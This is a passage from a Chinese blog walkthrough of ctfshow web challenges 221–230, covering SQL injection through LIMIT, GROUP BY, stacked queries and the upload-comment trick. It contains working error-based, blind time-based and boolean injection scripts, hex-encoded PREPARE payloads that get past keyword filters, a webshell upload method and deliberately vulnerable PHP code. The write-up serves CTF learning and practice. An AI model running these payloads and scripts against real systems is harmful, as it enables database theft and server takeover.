<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//TODO:很安全，不需要过滤</span>
<span class="token comment" spellcheck="true">//拿到数据库名字就算你赢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>按照链接的做法：</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">extractvalue(目标xml文档，xml路径):对XML文档进行查询的函数
?page=1&limit=7 procedure analyse(extractvalue(1,concat(666,database(),666)),1)

updatexml(目标xml文档，xml路径，更新的内容):更新xml文档的函数
?page=1&limit=7 procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web222——group-by-注入"><a href="#web222——group-by-注入" class="headerlink" title="web222——group by 注入"></a>web222——group by 注入</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group by <span class="token variable">$username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><a href="https://www.secpulse.com/archives/140616.html" target="_blank" rel="noopener">floor()报错注入</a></p>
<p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html" target="_blank" rel="noopener">CTF-sql-group by报错注入</a></p>
<p>y4的脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://6119f221-08cd-4363-88d4-1809bd590024.chall.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># 查数据库</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment" spellcheck="true"># 查列名字</span>
        <span class="token comment" spellcheck="true"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1"</span>
        <span class="token comment" spellcheck="true"># 查数据---不能一次查完越到后面越不准确</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>
        <span class="token comment" spellcheck="true"># flag{b747hfb7-P8e8-</span>

        params <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'u'</span><span class="token punctuation">:</span> f<span class="token string">"concat((if (ascii(substr(({payload}),{i},1))>{mid}, sleep(0.05), 2)), 1);"</span>

        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>此处用sleep代替了floor</p>
<h1 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group by <span class="token variable">$username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//TODO:很安全，不需要过滤</span>
<span class="token comment" spellcheck="true">//用户名不能是数字</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>利用原理</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">?u=if('a'='a',username,'a')
?u=if('a'='b',username,'a')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>脚本</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token string">'true'</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> res
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token string">"+true"</span>
        <span class="token keyword">return</span> res


url <span class="token operator">=</span> <span class="token string">"http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/"</span>
i <span class="token operator">=</span> <span class="token number">0</span>
res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># 查数据库-ctfshow_flagas</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment" spellcheck="true"># 查字段-flagasabc</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>
        <span class="token comment" spellcheck="true"># 查flag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>
        params <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"u"</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{generateNum(i)},{generateNum(1)}))>{generateNum(mid)},username,'a')"</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(r.json()['data'])</span>
        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>主要通过生成数字的函数，就原有的脚本进行了数字编码</p>
<h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p><strong>/robots.txt：</strong></p>
<pre class="line-numbers language-php"><code class="language-php">User<span class="token operator">-</span>agent<span class="token punctuation">:</span> <span class="token operator">*</span>
Disallow<span class="token punctuation">:</span> <span class="token operator">/</span>pwdreset<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816173211309.png" alt></p>
<p>登陆后是文件上传，经过测试任何文件都无法上传</p>
<p><a href="https://www.gem-love.com/ctf/2283.html#你没见过的注入" target="_blank" rel="noopener">你没见过的注入</a>经过这篇文章介绍，应该是需要修改文件的comments是我用的群里面的payload.bin文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816183907366.png" alt></p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816184141602.png" alt></p>
<p>这里的16进制为一句话木马，很有可能是原来的语句中，有一个解析comment的环节，正好到了这个环节也就中招了，括号被闭合，木马成功写入</p>
<p>getshell后读取upload.php</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Return Code: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"文件过大: "</span> <span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".zip"</span><span class="token punctuation">;</span>
      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$filepath</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$filetype</span><span class="token punctuation">.</span><span class="token string">"');"</span><span class="token punctuation">;</span>
      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"Error: "</span> <span class="token punctuation">.</span> <span class="token variable">$sql</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token punctuation">}</span>

<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>印证猜想，其中关键在filetype的解析环节导致了comment里面的内容被读取并写入，这在给出的文章中也有提到，相信仔细看的人都会发现：是因为finfo的缘故</p>
<h1 id="web225——Handler、预处理"><a href="#web225——Handler、预处理" class="headerlink" title="web225——Handler、预处理"></a>web225——<code>Handler、预处理</code></h1><p><a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450" target="_blank" rel="noopener">必看链接</a></p>
<p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//师傅说过滤的越多越好</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>方法一——Handler</strong></p>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
<pre class="line-numbers language-mysql"><code class="language-mysql">/api/?username=';show tables;-- -

/api/?username=';handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
<p><strong>方法二——预处理</strong></p>
<p><strong>标准格式</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE name from '[my sql sequece]';   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL        语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>我的格式</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from concat('selec','t * from ctfshow_flagasa');
EXECUTE yn8rt;
DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>concat(char(115,101,108,101,99,116)</code>也可以代替<code>select</code></p>
<h1 id="web226——预处理配合16进制"><a href="#web226——预处理配合16进制" class="headerlink" title="web226——预处理配合16进制"></a>web226——预处理配合16进制</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//师傅说过滤的越多越好</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><a href="https://www.sojson.com/hexadecimal.html" target="_blank" rel="noopener">来个在线转换地址</a></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;
EXECUTE yn8rt;
DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>直接拿到flag，但是不知道为什么<code>select database()</code>却得不到数据库名字</p>
<h1 id="web227——information-schema-routines查看存储过程和函数"><a href="#web227——information-schema-routines查看存储过程和函数" class="headerlink" title="web227——information_schema.routines查看存储过程和函数"></a>web227——<code>information_schema.routines</code>查看存储过程和函数</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//师傅说过滤的越多越好</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>考点：</strong></p>
<p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079" target="_blank" rel="noopener">MySQL——查看存储过程和函数</a><br><a href="https://blog.csdn.net/uftjtt/article/details/80435520" target="_blank" rel="noopener">mysql存储过程和函数总结</a></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">表中没有写入flag，而是把flag写在了储存过程和函数中

在 MySQL 中，存储过程和函数的信息存储在 information_schema 数据库下的 Routines 表中

查询语法：
SELECT * FROM information_schema.Routines WHERE ROUTINE_NAME = ’ sp_name ’ ;

其中，ROUTINE_NAME 字段中存储的是存储过程和函数的名称; sp_name 参数表示存储过程或函数的名称。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>依然利用预处理进行解题：</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;
EXECUTE yn8rt;
DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>记得闭合前面的单引号，在得知函数名为getFlag后继续精确操作：</p>
<p>  information_schema  数据库中的  Routines  表中，存储了所有存储过程和函数的定义。使用 SELECT 语句查询  Routines 表中的存储过程和函数的定义时，一定要使用 ROUTNE_NAME  字段指定存储过程或函数的名称。否则，将查询出所有的存储过程或函数的定义。如果存储过程和存储函数名称相同，则需要要同时指定  ROUTINE_TYPE  字段表明查询的是哪种类型的存储程序。</p>
<p><code>?username=user1&#39;;PREPARE yn8rt from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e657320776865726520726f7574696e655f6e616d65203d2027676574466c616727;EXECUTE yn8rt;</code></p>
<p><strong>16进制解码：</strong><code>select * from information_schema.routines where routine_name = &#39;getFlag&#39;</code></p>
<p>原来这里还可以藏flag</p>
<h1 id="web228、229、230"><a href="#web228、229、230" class="headerlink" title="web228、229、230"></a>web228、229、230</h1><p>与web226一样，还没开始今天的任务就结束了，爽啊！</p>

            </div>
            <hr/>

            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            
            
            
            <div class="reprint1">
                <p>
                    <span class="reprint1-tip">
                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
                    </span>
                    <a href="https://iceberg404.github.io" class="b-link-green">Yn8rt</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="/2021/07/24/ctfshow-zhi-web-si/" class="b-link-green">CTFshow之web(四)</a>
                </p>
            </div>

        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }
    /* valine 评论框增加背景图片 */
    #vcomments textarea {
        box-sizing: border-box;
        background: url("http://www.luckyzmj.cn/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments .vwrap {
        box-sizing: border-box;
        padding: 0 0 44px;
        background-color: #F0FFF0;
    }
    #vcomments .vwrap .vheader{width: 80%;bottom:0;position: absolute;background: #F0FFF0;}

    #vcomments .vinput{padding:10px 15px; text-align: center;}

    #vcomments .vwrap .vheader .vinput{border-bottom:0px}

    #vcomments .vwrap .vedit .vctrl{margin-top:-44px;right:0;position:absolute;margin-right:-3px;}

    #vcomments  .vwrap .vrow{position:absolute;right:0;bottom:0;width:20%;padding-top:0px;}

    #vcomments  .vrow {font-size: 0;padding: 0px 0;}

    #vcomments  .vicon {margin-right: 15px;}

    #vcomments  .vrow .vcol.vcol-30{display: none}

    #vcomments  .vedit .vctrl span.vpreview-btn{display: none}

    #vcomments  .vrow .vcol.vcol-70{width: 100%;}

    #vcomments  .vsubmit.vbtn{border-radius: 0;padding: 0;color: #fff;line-height: 44px;width:100%;border: none;background:#00ecbc;}

    #vcomments  .vcards .vcard .vh .vhead .vsys{background: #F0FFF0;}

    #vcomments  .vcards .vcard .vh .vmeta .vat{font-size: 12px;display: block;margin-left: 15px;float: right;color: #fff;background-color: #00ecbc;line-height: 20px;padding: 0 6px;border-radius: 3px;}

    @media screen and (max-width: 520px){
    #vcomments  .vwrap .vheader .vinput{width: 33.33%;padding:10px 5px;}  
    }

    #vcomments input[type=text],

    #vcomments input[type=email],

    #vcomments input[type=url],

    #vcomments textarea {
        box-sizing: border-box;
    }
    #vcomments .vwrap p {
        height: 20px;
        width: 20px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }
    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #42b983;
        font-weight: 500;
        text-decoration: underline;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
